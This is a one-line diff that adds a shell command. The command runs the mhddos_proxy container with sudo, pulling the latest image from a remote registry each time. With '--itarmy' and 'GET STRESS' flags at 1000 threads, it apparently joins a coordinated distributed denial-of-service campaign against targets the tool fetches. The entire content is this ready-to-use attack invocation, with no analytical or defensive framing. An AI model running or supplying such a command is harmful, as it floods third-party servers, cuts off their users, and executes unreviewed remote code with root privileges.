@@ -1,0 +1,1 @@
+sudo docker run --cpus 0.7 -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --itarmy --http-methods GET STRESS -t 1000 --debug
